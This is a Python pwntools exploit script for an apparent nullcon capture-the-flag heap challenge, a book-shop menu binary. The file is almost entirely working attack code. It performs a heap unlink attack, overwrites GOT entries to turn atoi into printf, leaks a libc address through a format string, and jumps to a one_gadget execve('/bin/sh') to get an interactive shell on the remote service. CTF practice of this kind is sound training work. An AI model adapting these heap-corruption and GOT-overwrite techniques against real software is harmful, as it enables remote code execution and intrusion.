from pwn import *

"""
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
"""

one_gadget_off = 0x4526a

#context.log_level = 'debug'

elf = ELF('challenge')

if args.REMOTE:
	p = remote('pwn2.ctf.nullcon.net', 5002)
	libc = ELF('libc-2.23.so')
else:
	p = process(elf.path)
	gdb.attach(p , gdbscript='''
		break * 0x400aee
		break * 0x400ab0
		continue
		''')

	libc = elf.libc

def make_choice(p, choice):
	p.sendafter(b'Checkout!\n', choice)

def buy_book(p, name, with_printf=False):
	make_choice(p, b'\n') if with_printf else make_choice(p, b'1\n')

	p.sendafter(b'book?\n', name)

def put_back(p, index, with_printf=False):
	make_choice(p, b'2\n')
	p.sendafter(b'return?\n', index)

def write_book(p, index, name, with_printf=False):
	make_choice(p, with_printf) if with_printf else make_choice(p, b'3\n')

	p.send(index)
	p.sendafter(b'book?\n', name)

def read_book(p, with_printf=False):
	make_choice(p, b' ' * 3 + b'\n') if with_printf else make_choice(p, b'4\n')

def checkout(p, with_printf=False):
	make_choice(p, b' ' * 4 + b'\n') if with_printf else make_choice(p, b'5\n')

p.sendafter(b'name?\n', b'saullo')

# Unlink attack

ptr_list_addr = 0x00000000006021a0

fake_fw = ptr_list_addr - 0x18
fake_bk = ptr_list_addr - 0x10

fake_chunk = p64(0) + p64(0xf1) + p64(fake_fw) + p64(fake_bk) + p64(0) * (0xd0//8) + p64(0xf0)

buy_book(p, b'A' * 0x8)
buy_book(p, b'B' * 0x8)

write_book(p, b'0\n', fake_chunk)

put_back(p, b'1\n')

# Point to atoi.got and exit.got

padding = p64(0) * 3 + p64(fake_fw)
payload = padding + p64(elf.got.exit) + p64(elf.got.atoi)

write_book(p, b'0\n', payload)

# Write print.plt into atoi.got

write_book(p, b'2\n', p64(elf.plt.printf))

# Leak libc address

delta = 0x3c4963

make_choice(p, b' \n')

p.sendafter(b'return?\n', b'%p\n')

leak_addr = int(p.recvline().strip(), 16)
libc.address = (leak_addr & 0xfffffffffffff000) - (delta & 0xfffffffffffff000)
one_gadget = libc.address + one_gadget_off

log.success('libc @ 0x%x' % (libc.address, ))
log.info('one_gadget @ 0x%x' % (one_gadget, ))

write_book(p, b'\n', p64(one_gadget), with_printf=b'  \n')

read_book(p, with_printf=True)

# checkout(p, with_printf=True)

p.interactive()
